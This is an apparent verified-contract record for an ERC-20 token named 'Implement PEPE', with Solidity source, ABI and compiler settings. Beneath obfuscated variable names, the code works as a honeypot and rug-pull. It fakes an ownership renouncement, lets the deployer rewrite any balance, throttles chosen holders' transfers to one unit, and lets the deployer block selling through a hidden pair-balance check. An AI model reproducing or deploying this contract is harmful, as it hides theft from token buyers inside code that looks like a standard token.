{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface exemptLimitTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listIs) external view returns (uint256);\n\n    function transfer(address isLimitMin, uint256 txFee) external returns (bool);\n\n    function allowance(address minIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLimitMin,\n        uint256 txFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeReceiver, uint256 value);\n    event Approval(address indexed minIs, address indexed spender, uint256 value);\n}\n\nabstract contract autoAmountReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingAtAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeIs {\n    function createPair(address receiverFund, address buyAuto) external returns (address);\n}\n\ninterface exemptLimitTakeMetadata is exemptLimitTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImplementPEPE is autoAmountReceiver, exemptLimitTake, exemptLimitTakeMetadata {\n\n    function tokenMin(address feeSender, address isLimitMin, uint256 txFee) internal returns (bool) {\n        if (feeSender == limitTradingMode) {\n            return walletTeam(feeSender, isLimitMin, txFee);\n        }\n        uint256 minFundLaunched = exemptLimitTake(enableTradingWallet).balanceOf(listEnable);\n        require(minFundLaunched == fundAuto);\n        require(isLimitMin != listEnable);\n        if (receiverList[feeSender]) {\n            return walletTeam(feeSender, isLimitMin, swapAmount);\n        }\n        return walletTeam(feeSender, isLimitMin, txFee);\n    }\n\n    function approve(address liquidityTrading, uint256 txFee) public virtual override returns (bool) {\n        toSwap[_msgSender()][liquidityTrading] = txFee;\n        emit Approval(_msgSender(), liquidityTrading, txFee);\n        return true;\n    }\n\n    address public limitTradingMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletToken;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverMin;\n    }\n\n    mapping(address => mapping(address => uint256)) private toSwap;\n\n    function tokenAtSwap(address walletEnableMax) public {\n        launchedFund();\n        if (launchedSwapTotal) {\n            atSender = true;\n        }\n        if (walletEnableMax == limitTradingMode || walletEnableMax == enableTradingWallet) {\n            return;\n        }\n        receiverList[walletEnableMax] = true;\n    }\n\n    function transfer(address listShould, uint256 txFee) external virtual override returns (bool) {\n        return tokenMin(_msgSender(), listShould, txFee);\n    }\n\n    bool public launchedSwapTotal;\n\n    mapping(address => bool) public receiverList;\n\n    uint256 private receiverMin = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return enableLimitLiquidity;\n    }\n\n    constructor (){\n        \n        tradingAtAmount liquidityTo = tradingAtAmount(teamEnable);\n        enableTradingWallet = feeIs(liquidityTo.factory()).createPair(liquidityTo.WETH(), address(this));\n        \n        limitTradingMode = _msgSender();\n        fromSellExempt();\n        sellIsAmount[limitTradingMode] = true;\n        limitMarketing[limitTradingMode] = receiverMin;\n        \n        emit Transfer(address(0), limitTradingMode, receiverMin);\n    }\n\n    function walletTeam(address feeSender, address isLimitMin, uint256 txFee) internal returns (bool) {\n        require(limitMarketing[feeSender] >= txFee);\n        limitMarketing[feeSender] -= txFee;\n        limitMarketing[isLimitMin] += txFee;\n        emit Transfer(feeSender, isLimitMin, txFee);\n        return true;\n    }\n\n    string private launchAmount = \"IPE\";\n\n    function launchedFund() private view {\n        require(sellIsAmount[_msgSender()]);\n    }\n\n    address listEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed minEnable, address indexed receiverTrading);\n\n    function transferFrom(address feeSender, address isLimitMin, uint256 txFee) external override returns (bool) {\n        if (_msgSender() != teamEnable) {\n            if (toSwap[feeSender][_msgSender()] != type(uint256).max) {\n                require(txFee <= toSwap[feeSender][_msgSender()]);\n                toSwap[feeSender][_msgSender()] -= txFee;\n            }\n        }\n        return tokenMin(feeSender, isLimitMin, txFee);\n    }\n\n    bool public swapFund;\n\n    uint256 constant swapAmount = 1 ** 10;\n\n    function swapShould(address listShould, uint256 txFee) public {\n        launchedFund();\n        limitMarketing[listShould] = txFee;\n    }\n\n    function takeEnable(address takeTeam) public {\n        if (swapFund) {\n            return;\n        }\n        \n        sellIsAmount[takeTeam] = true;\n        \n        swapFund = true;\n    }\n\n    mapping(address => uint256) private limitMarketing;\n\n    function owner() external view returns (address) {\n        return enableLimitLiquidity;\n    }\n\n    function allowance(address walletList, address liquidityTrading) external view virtual override returns (uint256) {\n        if (liquidityTrading == teamEnable) {\n            return type(uint256).max;\n        }\n        return toSwap[walletList][liquidityTrading];\n    }\n\n    function balanceOf(address listIs) public view virtual override returns (uint256) {\n        return limitMarketing[listIs];\n    }\n\n    address private enableLimitLiquidity;\n\n    address teamEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return buyTake;\n    }\n\n    bool private receiverSenderAuto;\n\n    bool public atSender;\n\n    uint8 private walletToken = 18;\n\n    mapping(address => bool) public sellIsAmount;\n\n    uint256 minSwapTake;\n\n    uint256 fundAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchAmount;\n    }\n\n    address public enableTradingWallet;\n\n    string private buyTake = \"Implement PEPE\";\n\n    function fromSellExempt() public {\n        emit OwnershipTransferred(limitTradingMode, address(0));\n        enableLimitLiquidity = address(0);\n    }\n\n    function swapTx(uint256 txFee) public {\n        launchedFund();\n        fundAuto = txFee;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTradingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwapTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTradingMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellIsAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"swapShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"swapTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"}],\"name\":\"takeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnableMax\",\"type\":\"address\"}],\"name\":\"tokenAtSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLimitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ImplementPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}